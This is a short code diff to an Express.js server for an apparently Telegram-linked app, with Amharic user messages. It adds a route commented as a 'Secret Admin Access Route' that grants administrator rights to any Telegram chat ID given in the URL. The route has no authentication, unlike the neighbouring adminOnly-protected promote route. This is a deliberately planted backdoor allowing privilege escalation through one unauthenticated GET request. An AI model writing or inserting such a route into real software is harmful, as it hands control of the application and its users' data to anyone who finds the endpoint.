@@ -51,6 +51,18 @@ app.post('/api/admin/promote-user', adminOnly, async (req, res) => {
     }
 });
 
+// Secret Admin Access Route
+app.get('/api/admin/make-me-admin/:chatId', async (req, res) => {
+    const { chatId } = req.params;
+    try {
+        const result = await db.query('UPDATE users SET is_admin = TRUE WHERE telegram_chat_id = $1 RETURNING *', [chatId]);
+        if (result.rows.length === 0) return res.status(404).json({ error: "ተጠቃሚው አልተገኘም" });
+        res.send(`<h1>ስኬታማ!</h1><p>Chat ID ${chatId} አሁን አድሚን ሆኗል። አሁን ወደ አድሚን ፓናል መግባት ይችላሉ።</p>`);
+    } catch (err) {
+        res.status(500).send("ስህተት አጋጥሟል");
+    }
+});
+
 // Telegram Webhook Endpoint
 app.post('/telegram-webhook', async (req, res) => {
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
